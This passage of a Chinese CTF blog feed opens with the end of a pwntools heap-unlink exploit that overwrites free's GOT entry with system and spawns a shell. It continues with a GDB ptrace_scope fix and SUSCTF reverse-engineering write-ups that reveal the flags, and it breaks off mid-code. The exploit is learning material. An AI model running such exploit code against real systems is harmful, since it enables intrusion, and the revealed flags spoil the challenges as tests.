data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\nOK\n'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>


<span class="token comment" spellcheck="true">#puts_addr = u64(p.recvuntil("\nOK\n",drop = True).ljust(8,'\x00'))</span>
<span class="token comment" spellcheck="true">#print hex(puts_addr)</span>
system <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#binsh = puts - libc.symbols['puts']+next(libc.search('/bin/sh'))</span>
read_in<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># free_got => system_got</span>
read_in<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
free_it<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>成功getshell  此题只用与学习unlink操作 以及学习glibc保护机制<br>由于ubuntu18.04中对堆操作进行了修改 所以此unlink.py在ubuntu18.04中无法成功leak  在malloc4个smallchunk后出现和并（继续研究～）</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先理解下unlink操作 &lt;/p&gt;
&lt;p&gt;初始三个chunk大小都为0x80&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;chunk1&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;chunk2&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;chunk3&lt;/th&gt;
&lt;/tr
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>GDB-attach-pid没有权限解决方法</title>
    <link href="http://iosmosis.github.io/2018/11/09/GDB-attach-pid%E6%B2%A1%E6%9C%89%E6%9D%83%E9%99%90%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <id>http://iosmosis.github.io/2018/11/09/GDB-attach-pid没有权限解决方法/</id>
    <published>2018-11-09T07:22:27.000Z</published>
    <updated>2018-11-09T07:52:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>gab调试时遇到</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> attach 15790
Attaching to process 15790
Could not attach to process.  If your uid matches the uid of the target
process, check the setting of /proc/sys/kernel/yama/ptrace_scope, or try
again as the root user.  For <span class="token function">more</span> details, see /etc/sysctl.d/10-ptrace.conf
warning: process 15790 is a zombie - the process has already terminated
ptrace: 不允许的操作.
</code></pre>
<p>解决方法：</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  ~ <span class="token function">sudo</span> <span class="token function">vi</span> /etc/sysctl.d/10-ptrace.conf
</code></pre>
<p>将 </p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">kernel.yama.ptrace_scope <span class="token operator">=</span> 1
</code></pre>
<p>改为</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">kernel.yama.ptrace_scope <span class="token operator">=</span> 0
</code></pre>
<p>重启即可</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;gab调试时遇到&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;bash&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SUSCTF-Writeup(Reverse)</title>
    <link href="http://iosmosis.github.io/2018/10/29/SUSCTF-Writeup-Reverse/"/>
    <id>http://iosmosis.github.io/2018/10/29/SUSCTF-Writeup-Reverse/</id>
    <published>2018-10-29T08:04:11.000Z</published>
    <updated>2018-10-29T12:11:54.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="60"><a href="#60" class="headerlink" title="60"></a>60</h3><p><img src="/2018/10/29/SUSCTF-Writeup-Reverse/1.png" alt=""><br>下载载入IDA 查看</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-Ch]</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Guess number: "</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">2333333</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congraz! You are right. This is your flag: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Nop. You should try harder~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>逻辑很简单 输入2333333即可getflag<br><img src="/2018/10/29/SUSCTF-Writeup-Reverse/2.png" alt=""> </p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">FLAG <span class="token punctuation">:</span> SUSCTF<span class="token punctuation">{</span>H3llo_wOr1d<span class="token operator">!</span><span class="token punctuation">}</span>
</code></pre>
<h3 id="70"><a href="#70" class="headerlink" title="70"></a>70</h3><p><img src="/2018/10/29/SUSCTF-Writeup-Reverse/3.png" alt=""><br>提示工具   uncompyle6</p>
<p>安装完毕 运行</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">uncompyle6 HelloPython.pyc
</code></pre>
<p>得到源代码</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">➜  下载 uncompyle6 HelloPython<span class="token punctuation">.</span>pyc
<span class="token comment" spellcheck="true"># uncompyle6 version 3.2.4</span>
<span class="token comment" spellcheck="true"># Python bytecode 3.6 (3379)</span>
<span class="token comment" spellcheck="true"># Decompiled from: Python 2.7.15rc1 (default, Apr 15 2018, 21:51:34) </span>
<span class="token comment" spellcheck="true"># [GCC 7.3.0]</span>
<span class="token comment" spellcheck="true"># Embedded file name: HelloPython.py</span>
<span class="token comment" spellcheck="true"># Compiled at: 2018-09-27 23:27:58</span>
<span class="token comment" spellcheck="true"># Size of source mod 2**32: 1227 bytes</span>
<span class="token keyword">import</span> sys
<span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I can't give you flag :("</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">Fibonacci</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token keyword">elif</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        numfn1 <span class="token operator">=</span> <span class="token number">0</span>
        numfn2 <span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            currentNum <span class="token operator">=</span> numfn1 <span class="token operator">+</span> numfn2
            numfn1 <span class="token operator">=</span> numfn2
            numfn2 <span class="token operator">=</span> currentNum

        <span class="token keyword">return</span> currentNum


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>str<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> len<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
    c <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>n <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
    j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        b1 <span class="token operator">=</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        b2 <span class="token operator">=</span> b1 <span class="token operator">^</span> key
        c1 <span class="token operator">=</span> b2 <span class="token operator">%</span> <span class="token number">16</span>
        c2 <span class="token operator">=</span> b2 <span class="token operator">//</span> <span class="token number">16</span>
        c1 <span class="token operator">=</span> c1 <span class="token operator">+</span> <span class="token number">65</span>
        c2 <span class="token operator">=</span> c2 <span class="token operator">+</span> <span class="token number">65</span>
        c<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> c1
        c<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> c2
        j <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">2</span>

    <span class="token keyword">return</span> c<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>str<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> len<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    <span class="token keyword">if</span> n <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        n <span class="token operator">=</span> n <span class="token operator">//</span> <span class="token number">2</span>
        b <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
        j <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
            c1 <span class="token operator">=</span> c<span class="token punctuation">[</span>j<span class="token punctuation">]</span>
            c2 <span class="token operator">=</span> c<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>
            j <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">2</span>
            c1 <span class="token operator">=</span> c1 <span class="token operator">-</span> <span class="token number">65</span>
            c2 <span class="token operator">=</span> c2 <span class="token operator">-</span> <span class="token number">65</span>
            b2 <span class="token operator">=</span> c2 <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> c1
            b1 <span class="token operator">=</span> b2 <span class="token operator">^</span> key
            b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> b1

        <span class="token keyword">return</span> b<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> Fibonacci<span class="token punctuation">(</span>int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'MFKFMFMELFJEEHIFMDDGMGAGCGKGAFLHAGAFPHGHLHHGAGBGICMHAFIHAGNHODLGCH'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># okay decompiling HelloPython.pyc</span>
</code></pre>
<p>分析 存在加密解密函数  如果满足第一个三处等于第四个参数且第一个参数大于10就输出解密后面的字符串 </p>
<p>这里我们可以删除 if语句 以及最前面的长度判断 直接print<br>所以可以得到源码</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># uncompyle6 version 3.2.4</span>
<span class="token comment" spellcheck="true"># Python bytecode 3.6 (3379)</span>
<span class="token comment" spellcheck="true"># Decompiled from: Python 2.7.15rc1 (default, Apr 15 2018, 21:51:34) </span>
<span class="token comment" spellcheck="true"># [GCC 7.3.0]</span>
<span class="token comment" spellcheck="true"># Embedded file name: HelloPython.py</span>
<span class="token comment" spellcheck="true"># Compiled at: 2018-09-27 23:27:58</span>
<span class="token comment" spellcheck="true"># Size of source mod 2**32: 1227 bytes</span>
<span class="token keyword">import</span> sys
<span class="token keyword">def</span> <span class="token function">Fibonacci</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token keyword">elif</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        numfn1 <span class="token operator">=</span> <span class="token number">0</span>
        numfn2 <span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            currentNum <span class="token operator">=</span> numfn1 <span class="token operator">+</span> numfn2
            numfn1 <span class="token operator">=</span> numfn2
            numfn2 <span class="token operator">=</span> currentNum

        <span class="token keyword">return</span> currentNum


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>str<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> len<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
    c <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>n <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
    j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        b1 <span class="token operator">=</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        b2 <span class="token operator">=</span> b1 <span class="token operator">^</span> key
        c1 <span class="token operator">=</span> b2 <span class="token operator">%</span> <span class="token number">16</span>
        c2 <span class="token operator">=</span> b2 <span class="token operator">//</span> <span class="token number">16</span>
        c1 <span class="token operator">=</span> c1 <span class="token operator">+</span> <span class="token number">65</span>
        c2 <span class="token operator">=</span> c2 <span class="token operator">+</span> <span class="token number">65</span>
        c<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> c1
        c<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> c2
        j <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">2</span>

    <span class="token keyword">return</span> c<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>str<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> len<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    <span class="token keyword">if</span> n <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        n <span class="token operator">=</span> n <span class="token operator">//</span> <span class="token number">2</span>
        b <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
        j <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
            c1 <span class="token operator">=</span> c<span class="token punctuation">[</span>j<span class="token punctuation">]</span>
            c2 <span class="token operator">=</span> c<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>
            j <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">2</span>
            c1 <span class="token operator">=</span> c1 <span class="token operator">-</span> <span class="token number">65</span>
            c2 <span class="token operator">=</span> c2 <span class="token operator">-</span> <span class="token number">65</span>
            b2 <span class="token operator">=</span> c2 <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> c1
            b1 <span class="token operator">=</span> b2 <span class="token operator">^</span> key
            b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> b1

        <span class="token keyword">return</span> b<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>


<span class="token keyword">print</span><span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'MFKFMFMELFJEEHIFMDDGMGAGCGKGAFLHAGAFPHGHLHHGAGBGICMHAFIHAGNHODLGCH'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>运行可以得到flag</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>SUSCTF{W3lcome_to_python&#39;s_wor1d}
</code></pre><h3 id="150"><a href="#150" class="headerlink" title="150"></a>150</h3><p><img src="/2018/10/29/SUSCTF-Writeup-Reverse/4.png" alt=""> </p>
<p>载入ida分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">30</span> <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">29</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v35 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Something wrong, you should try harder."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congrazzzzzz~ You got it!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Something wrong, you should try harder."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>可以得出flag长度为30且 要满足 if中的xor操作  这里处理一下两个数组<br><img src="/2018/10/29/SUSCTF-Writeup-Reverse/5.png" alt=""><br>得到可观代码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-134h]</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+90h] [rbp-B0h]</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+110h] [rbp-30h]</span>
  __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+118h] [rbp-28h]</span>
  __int64 v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+120h] [rbp-20h]</span>
  __int64 v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+128h] [rbp-18h]</span>
  __int64 v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+130h] [rbp-10h]</span>
  <span class="token keyword">unsigned</span> __int64 v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+138h] [rbp-8h]</span>

  v11 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">96</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">116</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">73</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">125</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">84</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">;</span>
